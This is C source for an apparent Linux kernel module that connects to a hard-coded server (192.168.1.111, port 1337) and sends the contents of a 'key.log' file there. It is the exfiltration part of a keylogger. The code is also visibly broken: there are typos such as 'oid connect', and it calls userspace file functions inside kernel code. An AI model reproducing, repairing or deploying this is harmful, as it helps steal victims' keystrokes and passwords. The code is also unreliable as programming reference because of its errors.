#include <linux/module.h>
#include <linux/kernel.h>

#include <asm/uaccess.h>
#include <asm/segment.h>

#include <linux/netdevice.h>
#include <linux/socket.h>
#include <linux/tcp.h>
#include <linux/net.h>
#include <linux/ip.h>
#include <linux/in.h>

#include <linux/keyboard.h>				
#include <linux/syscalls.h>				

#define CONNECTED      1				/* TCP connection established.     */
#define DISCONNECTED   0				/* TCP connection not established. */
#define BUFFER_SIZE 1024				/* Message size					   */

char buffer[BUFFER_SIZE];
/**
 * NETWORK LISTENING FUNCTIONALITY
**/
struct packet_type  net_proto;
struct sockaddr_in  sock_in;
struct socket       *sock;

unsigned long  int server_ip;
unsigned short int server_port;
int connection_state;

oid connect(void)
{
	printk("Initializing network socket.\n");
	if(sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock) < 0)
	{
		printk("Error in creating socket.\n");
	}

	memset(&sock_in, 0, sizeof(sock_in));
	sock_in.sin_family = AF_INET;
	sock_in.sin_addr.s_addr = htonl((unsigned long) server_ip);
	sock_in.sin_port = htons((unsigned short) server_port);

	if (sock->ops->connect(sock, (struct sockaddr*)&sock_in, sizeof(sock_in), 0) < 0)
		printk("Could not connect.\n");
	else
	{
		connection_state = CONNECTED;
		printk("Connected to server.\n");
	}
}

void send_file(struct socket *sock)
{
	// If not connected
	if (!connection_state)
	{
		printk("Attempting to connect to TCP server.\n");
		connect();
	}
	else
	{
		File *fp = fopen ("key.log", "r");
		while (!feof(fp))
		{
			fread (buffer, sizeof(char), BUFFER_SIZE, fp);
			write (sock, buffer, BUFFER_SIZE);
		}
		
		fclose(fp);
	}
}

int start(void)
{
	/**
	 * Addresses:
	 *   - 0x7F000001 is "127.0.0.1" in host byte order.
	 * 	 - 0xC0A80149 is "192.168.1.111" in host byte order.
	 * Ports:
	 * 	 - 0x539 is "1337" in host byte order.
	**/ 
	server_ip   = 0xC0A80149;
	server_port = 0x539     ; 
    
	printk("Starting network-listening thread.\n");
	send_file(sock);
	connection_state = DISCONNECTED;
	
	return 0;
}


void stop(void)
{
	
	if (sock->ops->shutdown(sock, 2) < 0)
		printk("Could not close the socket.\n");
	else
	{
		connection_state = DISCONNECTED;
		printk("Closed the socket.\n");
	}

	printk("cyall");
}

module_init(start);
module_exit(stop);
